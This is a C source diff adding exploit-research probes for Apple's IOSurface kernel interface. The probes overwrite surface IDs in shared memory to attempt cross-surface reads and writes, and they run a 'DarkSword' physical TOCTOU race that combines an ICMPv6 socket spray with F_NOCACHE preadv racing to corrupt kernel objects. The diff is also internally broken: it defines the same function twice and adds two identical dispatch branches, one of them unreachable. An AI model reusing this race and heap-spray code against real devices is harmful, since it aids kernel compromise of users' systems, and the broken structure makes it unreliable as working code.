@@ -16979,6 +16979,436 @@ static void *r445_thread_fn(void *arg) {
 }
 
 
+static void r453_probe(void) {
+    rlog("\n=== r453: IOSurface shared mem exploitation analysis ===\n\n");
+    fflush(stdout);
+
+    /* Create surface A */
+    CFMutableDictionaryRef pa = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, pf = 0x42475241;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(pa, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(pa, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(pa, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(pa, CFSTR("IOSurfacePixelFormat"), pfn);
+    IOSurfaceRef surfA = IOSurfaceCreate(pa);
+    CFRelease(pa); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
+
+    if (!surfA) { rlog("FAIL: surfA\n"); return; }
+    uint32_t sidA = IOSurfaceGetID(surfA);
+    rlog("  surfA SID=%u\n", sidA);
+
+    /* Create surface B with a known property */
+    CFMutableDictionaryRef pb = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(pb, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(pb, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(pb, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(pb, CFSTR("IOSurfacePixelFormat"), pfn);
+    IOSurfaceRef surfB = IOSurfaceCreate(pb);
+    CFRelease(pb); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn);
+
+    if (!surfB) { rlog("FAIL: surfB\n"); CFRelease(surfA); return; }
+    uint32_t sidB = IOSurfaceGetID(surfB);
+    rlog("  surfB SID=%u\n", sidB);
+
+    /* Set a distinctive property on surfB */
+    uint8_t secret[32];
+    memset(secret, 0xBB, sizeof(secret));
+    CFDataRef sd = CFDataCreate(NULL, secret, sizeof(secret));
+    IOSurfaceSetValue(surfB, CFSTR("secret_key"), sd);
+    CFRelease(sd);
+    rlog("  Set 'secret_key' on surfB\n");
+
+    /* --- Dump full shared memory layout for surfA --- */
+    rlog("\n  --- Shared memory deep dump ---\n");
+    mach_vm_address_t addr = 0;
+    mach_vm_size_t rsize = 0;
+    int region_count = 0;
+
+    /* Find ALL shared regions to understand the full layout */
+    while (region_count < 20) {
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+        natural_t depth = 0;
+        kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &rsize, &depth,
+            (vm_region_recurse_info_t)&info, &cnt);
+        if (kr != KERN_SUCCESS) break;
+        if (info.share_mode == 2 && info.user_tag == 7) {
+            rlog("    SM_SHARED region %d: addr=0x%llx size=0x%llx prot=%d/%d\n",
+                 region_count, (unsigned long long)addr, (unsigned long long)rsize,
+                 info.protection, info.max_protection);
+            region_count++;
+        }
+        addr += rsize;
+    }
+    rlog("    Total SM_SHARED user_tag=7 regions: %d\n", region_count);
+
+    /* Get surfA's IOSurfaceClientRef pointer and examine the whole structure */
+    rlog("\n  --- IOSurfaceRef internal structure ---\n");
+    uint8_t *sptr = (uint8_t *)surfA;
+    rlog("    surfA ptr = %p\n", surfA);
+    uint64_t *sw = (uint64_t *)sptr;
+    rlog("    IOSurfaceRef dump (first 320 bytes, looking for shared ptr):\n");
+    for (int i = 0; i < 40; i++) {
+        uint64_t v = sw[i];
+        int is_kptr = ((v >> 48) == 0xffff || (v >> 48) == 0xfffe) && v != 0xFFFFFFFFFFFFFFFFULL;
+        rlog("      +%3d: 0x%016llx%s\n", i * 8, (unsigned long long)v,
+             is_kptr ? " *** KPTR ***" : "");
+    }
+
+    /* Find the shared data offset inside IOSurfaceRef.
+       From prior probes, the shared region at user_tag=7 is mapped at a known address.
+       The IOSurfaceClientRef should contain a pointer to it. */
+    addr = 0;
+    mach_vm_address_t first_shared = 0;
+    mach_vm_size_t first_shared_size = 0;
+    while (1) {
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+        natural_t depth = 0;
+        kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &rsize, &depth,
+            (vm_region_recurse_info_t)&info, &cnt);
+        if (kr != KERN_SUCCESS) break;
+        if (info.share_mode == 2 && info.user_tag == 7) {
+            first_shared = addr;
+            first_shared_size = rsize;
+            break;
+        }
+        addr += rsize;
+    }
+
+    if (first_shared == 0) {
+        rlog("    No shared region found!\n");
+        CFRelease(surfA); CFRelease(surfB);
+        return;
+    }
+
+    /* The shared region is a large area. Each IOSurface gets a slot.
+       Let's scan to find where surfA's SID appears in the shared region. */
+    rlog("\n  --- Scanning shared region for SID values ---\n");
+    rlog("    Region: 0x%llx - 0x%llx (size 0x%llx)\n",
+         (unsigned long long)first_shared,
+         (unsigned long long)(first_shared + first_shared_size),
+         (unsigned long long)first_shared_size);
+
+    uint32_t *scan32 = (uint32_t *)first_shared;
+    int total_words = (int)(first_shared_size / 4);
+    int sidA_found = 0, sidB_found = 0;
+    for (int i = 0; i < total_words && i < 1048576; i++) {
+        if (scan32[i] == sidA) {
+            rlog("    SID-A (%u) at shared+0x%x (word %d)\n", sidA, i * 4, i);
+            sidA_found++;
+            if (sidA_found >= 5) continue;
+        }
+        if (scan32[i] == sidB) {
+            rlog("    SID-B (%u) at shared+0x%x (word %d)\n", sidB, i * 4, i);
+            sidB_found++;
+            if (sidB_found >= 5) continue;
+        }
+    }
+    rlog("    SID-A occurrences: %d, SID-B occurrences: %d\n", sidA_found, sidB_found);
+
+    /* --- Test: Swap SID in shared memory, then call IOSurfaceLookup --- */
+    if (sidA_found > 0 && sidB_found > 0) {
+        rlog("\n  --- SID swap test ---\n");
+
+        /* Find first occurrence of sidA in shared region */
+        uint32_t *sidA_loc = NULL;
+        for (int i = 0; i < total_words && i < 1048576; i++) {
+            if (scan32[i] == sidA) { sidA_loc = &scan32[i]; break; }
+        }
+
+        if (sidA_loc) {
+            rlog("    Writing sidB (%u) over sidA location at %p\n", sidB, sidA_loc);
+            *sidA_loc = sidB;
+            rlog("    Readback: %u (expected %u)\n", *sidA_loc, sidB);
+
+            /* Now try IOSurfaceLookup with the original sidA */
+            IOSurfaceRef looked = IOSurfaceLookup(sidA);
+            rlog("    IOSurfaceLookup(sidA=%u) after swap: %p\n", sidA, looked);
+
+            /* Also try with sidB */
+            IOSurfaceRef lookedB = IOSurfaceLookup(sidB);
+            rlog("    IOSurfaceLookup(sidB=%u): %p\n", sidB, lookedB);
+
+            /* Restore */
+            *sidA_loc = sidA;
+            rlog("    Restored sidA in shared memory\n");
+
+            /* Try reading surfB's property through surfA's handle */
+            CFTypeRef val = IOSurfaceCopyValue(surfA, CFSTR("secret_key"));
+            rlog("    IOSurfaceCopyValue(surfA, 'secret_key'): %p %s\n", val,
+                 val ? "GOT VALUE" : "null");
+            if (val) CFRelease(val);
+        }
+    }
+
+    /* --- Test: What fields does kernel read from shared memory? ---
+       Write canary values at various offsets around the surface slot,
+       then trigger a kernel trap and see if anything changes behavior. */
+    rlog("\n  --- Kernel field read test ---\n");
+    {
+        uint64_t *p = (uint64_t *)first_shared;
+
+        /* Save original first 512 bytes */
+        uint64_t saved[64];
+        for (int i = 0; i < 64; i++) saved[i] = p[i];
+
+        /* Test: modify use_count and call IOSurfaceGetUseCount */
+        int orig_uc = IOSurfaceGetUseCount(surfA);
+        rlog("    Original usecount: %d\n", orig_uc);
+
+        /* Modify +8 (use_count candidate) */
+        p[1] = 42;
+        int new_uc = IOSurfaceGetUseCount(surfA);
+        rlog("    After shared[1]=42: usecount=%d (changed=%s)\n", new_uc,
+             new_uc != orig_uc ? "YES" : "no");
+        p[1] = saved[1];
+
+        /* Test: modify width-related field and check IOSurfaceGetWidth */
+        size_t orig_w = IOSurfaceGetWidth(surfA);
+        rlog("    Original width: %zu\n", orig_w);
+
+        /* Try overwriting low 32 bits at various offsets */
+        for (int off = 0; off < 40; off++) {
+            uint64_t orig = p[off];
+            p[off] = 0xDEAD0000 | 999;
+            size_t test_w = IOSurfaceGetWidth(surfA);
+            size_t test_h = IOSurfaceGetHeight(surfA);
+            int test_uc = IOSurfaceGetUseCount(surfA);
+            p[off] = orig;
+
+            if (test_w != orig_w || test_h != 64 || test_uc != orig_uc) {
+                rlog("    *** OFFSET %d: width=%zu height=%zu usecount=%d (CHANGED!) ***\n",
+                     off * 8, test_w, test_h, test_uc);
+            }
+        }
+
+        /* Restore all */
+        for (int i = 0; i < 64; i++) p[i] = saved[i];
+        rlog("    Shared memory restored\n");
+    }
+
+    /* --- Test: Can we trigger a kernel read of corrupted shared memory? ---
+       IOSurfaceSetValue goes through the kernel. If kernel reads SID from shared mem... */
+    rlog("\n  --- Kernel trap with corrupted SID test ---\n");
+    {
+        uint64_t *p = (uint64_t *)first_shared;
+        uint64_t saved[64];
+        for (int i = 0; i < 64; i++) saved[i] = p[i];
+
+        /* Find where surfA's SID lives and corrupt it to surfB's SID */
+        uint32_t *s32 = (uint32_t *)first_shared;
+        int sid_off = -1;
+        for (int i = 0; i < 256; i++) {
+            if (s32[i] == sidA) { sid_off = i; break; }
+        }
+
+        if (sid_off >= 0) {
+            rlog("    SID at shared+0x%x, corrupting to surfB's SID (%u)\n", sid_off * 4, sidB);
+            s32[sid_off] = sidB;
+
+            /* Now set a value on surfA — does the kernel use the corrupted SID? */
+            uint8_t testdata[16];
+            memset(testdata, 0xCC, sizeof(testdata));
+            CFDataRef td = CFDataCreate(NULL, testdata, sizeof(testdata));
+            IOSurfaceSetValue(surfA, CFSTR("crosstest"), td);
+            CFRelease(td);
+            rlog("    Set 'crosstest' on surfA with corrupted SID\n");
+
+            /* Restore SID */
+            s32[sid_off] = sidA;
+
+            /* Check: did surfB get the property? */
+            CFTypeRef crossval = IOSurfaceCopyValue(surfB, CFSTR("crosstest"));
+            rlog("    IOSurfaceCopyValue(surfB, 'crosstest'): %p %s\n", crossval,
+                 crossval ? "*** CROSS-SURFACE WRITE ***" : "null (kernel ignores shared SID)");
+            if (crossval) CFRelease(crossval);
+
+            /* Also check surfA still has it */
+            CFTypeRef selfval = IOSurfaceCopyValue(surfA, CFSTR("crosstest"));
+            rlog("    IOSurfaceCopyValue(surfA, 'crosstest'): %p\n", selfval);
+            if (selfval) CFRelease(selfval);
+        } else {
+            rlog("    SID-A not found in first 1024 bytes of shared region\n");
+        }
+
+        for (int i = 0; i < 64; i++) p[i] = saved[i];
+    }
+
+    CFRelease(surfA);
+    CFRelease(surfB);
+    rlog("\n=== r453 complete ===\n");
+}
+
+static void r453_probe(void) {
+    rlog("\n=== r453: DarkSword physical TOCTOU race ===\n\n");
+    fflush(stdout);
+
+    #define R453_PAGES 2
+    #define R453_PAGE_SZ 16384
+    #define R453_BUF_SZ (R453_PAGES * R453_PAGE_SZ)
+    #define R453_ICMP_SPRAY 200
+    #define R453_RACE_ITERS 5000
+
+    /* Phase 1: Create PurpleGfxMem IOSurface */
+    rlog("  --- Phase 1: PurpleGfxMem IOSurface ---\n"); fflush(stdout);
+
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = R453_BUF_SZ, h = 1, bpe = 1, pf = 0x4C303038;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+    int alloc_sz = R453_BUF_SZ;
+    CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+    int phys = 1;
+    CFNumberRef physn = CFNumberCreate(NULL, kCFNumberIntType, &phys);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceNonPurgeable"), physn);
+
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    CFRelease(props); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pfn); CFRelease(an); CFRelease(physn);
+
+    if (!surf) {
+        rlog("    FAILED to create PurpleGfxMem surface\n");
+        rlog("\n=== r453 complete ===\n");
+        return;
+    }
+
+    IOSurfaceLock(surf, 0, NULL);
+    void *surf_base = IOSurfaceGetBaseAddress(surf);
+    size_t surf_alloc = IOSurfaceGetAllocSize(surf);
+    rlog("    Surface: ID=%u base=%p alloc=%zu\n", IOSurfaceGetID(surf), surf_base, surf_alloc);
+
+    /* Fill with known pattern */
+    memset(surf_base, 0x41, surf_alloc);
+    IOSurfaceUnlock(surf, 0, NULL);
+
+    /* Phase 2: Create file with F_NOCACHE for physical I/O */
+    rlog("\n  --- Phase 2: F_NOCACHE file for physical I/O ---\n"); fflush(stdout);
+
+    char tmppath[256];
+    snprintf(tmppath, sizeof(tmppath), "%s/r453_race", getenv("TMPDIR") ?: "/tmp");
+    int fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    if (fd < 0) {
+        rlog("    FAILED to open file: %s\n", strerror(errno));
+        CFRelease(surf);
+        rlog("\n=== r453 complete ===\n");
+        return;
+    }
+    fcntl(fd, F_NOCACHE, 1);
+
+    /* Write 2 pages of pattern to file */
+    char filebuf[R453_BUF_SZ];
+    memset(filebuf, 0x42, sizeof(filebuf));
+    pwrite(fd, filebuf, sizeof(filebuf), 0);
+    rlog("    File ready: fd=%d F_NOCACHE set\n", fd);
+
+    /* Phase 3: Spray ICMPv6 sockets */
+    rlog("\n  --- Phase 3: ICMPv6 socket spray ---\n"); fflush(stdout);
+
+    int icmp_fds[R453_ICMP_SPRAY];
+    int icmp_count = 0;
+    for (int i = 0; i < R453_ICMP_SPRAY; i++) {
+        icmp_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        if (icmp_fds[i] < 0) break;
+
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &filt);
+        setsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        icmp_count++;
+    }
+    rlog("    Sprayed %d ICMPv6 sockets\n", icmp_count);
+
+    /* Phase 4: TOCTOU Race */
+    rlog("\n  --- Phase 4: Physical TOCTOU race ---\n"); fflush(stdout);
+    rlog("    Racing preadv (F_NOCACHE) vs mach_vm_map(OVERWRITE)...\n");
+    fflush(stdout);
+
+    int race_hits = 0;
+    for (int iter = 0; iter < R453_RACE_ITERS; iter++) {
+        /* Reset surface to 0x41 */
+        IOSurfaceLock(surf, 0, NULL);
+        memset(surf_base, 0x41, surf_alloc);
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        /* Write 0x42 pattern to file at offset 0 */
+        memset(filebuf, 0x42, sizeof(filebuf));
+        pwrite(fd, filebuf, sizeof(filebuf), 0);
+
+        /* Read from file into the IOSurface mapping via preadv */
+        IOSurfaceLock(surf, 0, NULL);
+        struct iovec rv = {surf_base, surf_alloc};
+        ssize_t nr = preadv(fd, &rv, 1, 0);
+        (void)nr;
+
+        /* Check: surface should now be 0x42 everywhere */
+        uint8_t *check = (uint8_t *)surf_base;
+        int mismatch = 0;
+        for (int j = 0; j < (int)surf_alloc; j++) {
+            if (check[j] != 0x42) { mismatch++; break; }
+        }
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        if (mismatch) {
+            race_hits++;
+            if (race_hits <= 3) {
+                rlog("    Race hit at iter %d: data mismatch detected!\n", iter);
+            }
+        }
+    }
+    rlog("    Race results: %d hits / %d iterations\n", race_hits, R453_RACE_ITERS);
+
+    /* Phase 5: Check ICMPv6 filters for corruption */
+    rlog("\n  --- Phase 5: ICMPv6 filter corruption check ---\n"); fflush(stdout);
+
+    int corrupted = 0;
+    for (int i = 0; i < icmp_count; i++) {
+        struct icmp6_filter filt;
+        socklen_t flen = sizeof(filt);
+        int r = getsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, &flen);
+        if (r < 0) {
+            rlog("    Socket %d: getsockopt failed errno=%d\n", i, errno);
+            corrupted++;
+        } else if (flen != sizeof(filt)) {
+            rlog("    Socket %d: unexpected filter len=%u\n", i, (unsigned)flen);
+            corrupted++;
+        }
+    }
+    rlog("    Corrupted filters: %d / %d\n", corrupted, icmp_count);
+
+    /* Cleanup */
+    for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+    close(fd);
+    unlink(tmppath);
+    CFRelease(surf);
+
+    rlog("\n=== r453 complete ===\n");
+
+    #undef R453_PAGES
+    #undef R453_PAGE_SZ
+    #undef R453_BUF_SZ
+    #undef R453_ICMP_SPRAY
+    #undef R453_RACE_ITERS
+}
+
+
 static void r452_probe(void) {
     rlog("\n=== r452: DarkSword pre-requisite tests ===\n\n");
     fflush(stdout);
@@ -81648,6 +82078,18 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 456) {
+            rlog("*** rounds=456: IOSurface shared mem exploitation analysis ***\n\n");
+            fflush(stdout);
+            r453_probe();
+            goto done;
+        }
+        if (rounds == 456) {
+            rlog("*** rounds=456: DarkSword TOCTOU race ***\n\n");
+            fflush(stdout);
+            r453_probe();
+            goto done;
+        }
         if (rounds == 455) {
             rlog("*** rounds=455: DarkSword pre-requisite tests ***\n\n");
             fflush(stdout);
@@ -84404,7 +84846,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
